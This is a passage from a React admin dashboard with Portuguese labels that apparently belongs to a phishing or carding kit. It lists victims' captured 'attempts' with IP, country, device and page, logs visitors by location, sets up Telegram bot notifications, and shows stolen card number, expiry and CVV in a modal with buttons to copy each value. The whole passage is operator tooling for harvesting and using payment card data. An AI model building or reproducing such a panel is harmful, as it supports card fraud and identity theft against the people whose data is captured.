                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>

                  {/* Footer com informações */}
                  <div className="bg-[#0a0a0a] px-4 py-3 text-xs text-gray-300 border-t border-[#2a2a2a]">
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                      <div><span className="font-semibold text-gray-400">IP:</span> {attempt.ip_address || "-"}</div>
                      <div><span className="font-semibold text-gray-400">País:</span> {attempt.country || "-"}</div>
                      <div><span className="font-semibold text-gray-400">Dispositivo:</span> {attempt.device || "Desktop"}</div>
                      <div><span className="font-semibold text-gray-400">Página atual:</span> {attempt.page || "Página Loading..."}</div>
                    </div>
                  </div>
                </div>
                );
              })}
            </div>
          )}
        </div>
      </div>

      {/* ========== MODAL TELEGRAM ========== */}
      {showTelegramModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setShowTelegramModal(false)}>
          <div className="bg-[#111111] border border-green-900/40 rounded-xl w-full max-w-lg p-6" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-xl font-bold text-white">Configurar Telegram</h2>
              <button onClick={() => setShowTelegramModal(false)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
            </div>

            <div className="space-y-4">
              {/* Toggle Ativar/Desativar */}
              <div className="flex items-center justify-between bg-[#0a0a0a] border border-[#333] rounded-lg px-4 py-3">
                <span className="text-white font-medium text-sm">Notificações</span>
                <button
                  onClick={() => setTelegramEnabled(!telegramEnabled)}
                  className={`relative w-12 h-6 rounded-full transition-colors ${telegramEnabled ? 'bg-green-500' : 'bg-gray-600'}`}
                >
                  <span className={`absolute top-0.5 w-5 h-5 bg-white rounded-full transition-transform ${telegramEnabled ? 'left-6' : 'left-0.5'}`}></span>
                </button>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">Bot Token</label>
                <input
                  type="text"
                  value={telegramToken}
                  onChange={(e) => setTelegramToken(e.target.value)}
                  placeholder="123456789:ABCdefGHI..."
                  className="w-full px-4 py-2 bg-[#0a0a0a] border border-[#333] rounded-lg text-white placeholder-gray-600 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">Chat ID</label>
                <input
                  type="text"
                  value={telegramChatId}
                  onChange={(e) => setTelegramChatId(e.target.value)}
                  placeholder="-1001234567890"
                  className="w-full px-4 py-2 bg-[#0a0a0a] border border-[#333] rounded-lg text-white placeholder-gray-600 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50"
                />
              </div>

              {telegramMessage && (
                <div className={`px-4 py-2 rounded-lg text-sm ${telegramMessage.includes("Erro") ? "bg-red-900/30 border border-red-500/30 text-red-400" : "bg-green-900/30 border border-green-500/30 text-green-400"}`}>
                  {telegramMessage}
                </div>
              )}

              <div className="flex gap-3 pt-2">
                <button
                  onClick={saveTelegramConfig}
                  disabled={telegramSaving}
                  className="flex-1 bg-green-900/40 text-white font-bold border border-green-500/40 py-2 rounded-lg hover:bg-green-900/60 transition-colors disabled:opacity-50"
                >
                  {telegramSaving ? "Salvando..." : "Salvar"}
                </button>
                <button
                  onClick={testTelegram}
                  className="flex-1 bg-[#1a1a1a] text-white font-bold border border-cyan-500/30 py-2 rounded-lg hover:bg-[#252525] transition-colors"
                >
                  Enviar Teste
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ========== MODAL VISITANTES ========== */}
      {showVisitorsModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setShowVisitorsModal(false)}>
          <div className="bg-[#111111] border border-green-900/40 rounded-xl w-full max-w-4xl max-h-[80vh] flex flex-col" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between p-6 border-b border-[#2a2a2a]">
              <h2 className="text-xl font-bold text-white">Visitantes ({visitors.length})</h2>
              <div className="flex gap-3">
                <button onClick={clearVisitors} className="bg-[#1a1a1a] hover:bg-red-900/40 text-white font-bold border border-red-500/30 px-4 py-1.5 rounded text-sm transition-colors">
                  Limpar
                </button>
                <button onClick={() => setShowVisitorsModal(false)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
              </div>
            </div>

            <div className="overflow-auto flex-1 p-4">
              {visitorsLoading ? (
                <div className="text-center py-12">
                  <div className="inline-block animate-spin rounded-full h-10 w-10 border-b-2 border-green-500"></div>
                  <p className="mt-3 text-gray-400">Carregando...</p>
                </div>
              ) : visitors.length === 0 ? (
                <div className="text-center py-12">
                  <p className="text-gray-500">Nenhum visitante registrado</p>
                </div>
              ) : (
                <table className="w-full border-collapse">
                  <thead>
                    <tr>
                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">#</th>
                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">IP</th>
                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Cidade</th>
                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Estado</th>
                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">País</th>
                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Horário</th>
                    </tr>
                  </thead>
                  <tbody>
                    {visitors.map((visitor, index) => (
                      <tr key={visitor.id || index} className="bg-[#0f0f0f] hover:bg-green-900/10">
                        <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a]">{index + 1}</td>
                        <td className="px-4 py-2 text-sm text-white border border-[#2a2a2a] font-mono">{visitor.ip}</td>
                        <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.city || "-"}</td>
                        <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.state || "-"}</td>
                        <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.country || "-"}</td>
                        <td className="px-4 py-2 text-sm text-gray-400 border border-[#2a2a2a]">
                          {new Date(visitor.timestamp).toLocaleString("pt-BR")}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ========== MODAL CC - DADOS DO CARTÃO ========== */}
      {ccModalData && (() => {
        const parts = ccModalData.split(" | ");
        const numero = parts[0] || "-";
        const validade = parts[1] || "-";
        const cvv = parts[2] || "-";
        return (
          <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setCcModalData(null)}>
            <div className="bg-[#111111] border border-[#333] rounded-xl w-full max-w-sm p-6" onClick={(e) => e.stopPropagation()}>
              <div className="flex items-center justify-between mb-6">
                <h2 className="text-lg font-bold text-white">Dados do Cartão</h2>
                <button onClick={() => setCcModalData(null)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-xs text-gray-500 mb-1">Número do Cartão</label>
                  <div
                    onClick={() => copyToClipboard(numero, "cc-numero")}
                    className="bg-[#0a0a0a] border border-[#333] rounded-lg px-4 py-3 text-white font-mono text-lg cursor-pointer hover:border-gray-500 transition-colors"
                  >
                    {copiedField === "cc-numero" ? <span className="text-green-400">Copiado!</span> : numero}
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-xs text-gray-500 mb-1">Validade</label>
                    <div
                      onClick={() => copyToClipboard(validade, "cc-validade")}
                      className="bg-[#0a0a0a] border border-[#333] rounded-lg px-4 py-3 text-white font-mono text-lg text-center cursor-pointer hover:border-gray-500 transition-colors"
                    >
                      {copiedField === "cc-validade" ? <span className="text-green-400">Copiado!</span> : validade}
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs text-gray-500 mb-1">CVV</label>
                    <div
                      onClick={() => copyToClipboard(cvv, "cc-cvv")}
                      className="bg-[#0a0a0a] border border-[#333] rounded-lg px-4 py-3 text-white font-mono text-lg text-center cursor-pointer hover:border-gray-500 transition-colors"
                    >
                      {copiedField === "cc-cvv" ? <span className="text-green-400">Copiado!</span> : cvv}
                    </div>
                  </div>
                </div>

                <button
                  onClick={() => copyToClipboard(ccModalData, "cc-all")}
                  className="w-full bg-[#1a1a1a] text-white font-bold border border-gray-600/40 py-2.5 rounded-lg hover:bg-[#252525] transition-colors text-sm mt-2"
                >
                  {copiedField === "cc-all" ? "Tudo Copiado!" : "Copiar Tudo"}
                </button>
              </div>
            </div>
          </div>
        );
      })()}
    </div>
  );
}

export default AdminPanel;
